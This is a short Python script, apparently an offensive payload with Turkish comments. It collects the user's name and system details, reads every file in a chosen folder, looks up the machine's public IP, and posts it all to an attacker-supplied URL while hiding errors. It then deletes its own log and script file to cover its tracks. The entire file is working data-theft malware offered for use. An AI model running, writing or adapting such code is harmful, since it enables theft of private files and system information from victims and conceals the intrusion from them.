import requests
import os
import platform
import shutil
import sys

def collect_info():
    # Bilgi toplama
    system_info = {
        "user": os.getenv("USER") or os.getenv("USERNAME"),
        "os_name": os.name,
        "platform": platform.system(),
        "release": platform.release(),
    }
    return system_info

def collect_files(target_folder):
    # Belirli bir klasörden dosyaları toplama
    files_collected = {}
    for root, dirs, files in os.walk(target_folder):
        for file in files:
            file_path = os.path.join(root, file)
            try:
                with open(file_path, "r", errors="ignore") as f:
                    files_collected[file] = f.read()
            except:
                pass
    return files_collected

def send_data(url, data):
    try:
        response = requests.post(url, json=data)
        print(f"Bilgiler gönderildi. Durum kodu: {response.status_code}")
    except:
        pass  # Hataları sessizce geç

def clean_up(ip_file, script_path):
    # IP'yi unutturma ve kendini kaldırma
    if os.path.exists(ip_file):
        os.remove(ip_file)
    if os.path.exists(script_path):
        os.remove(script_path)

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Kullanım: python payload.py <hedef_url> <target_folder>")
        sys.exit(1)

    target_url = sys.argv[1]
    target_folder = sys.argv[2]

    # IP adresini kaydetme
    ip_file = "ip_log.txt"
    with open(ip_file, "w") as f:
        f.write(requests.get("https://api.ipify.org").text)

    # Bilgi ve dosya toplama
    data = {
        "info": collect_info(),
        "files": collect_files(target_folder),
    }

    # Verileri gönderme
    send_data(target_url, data)

    # İzleri temizle
    clean_up(ip_file, sys.argv[0])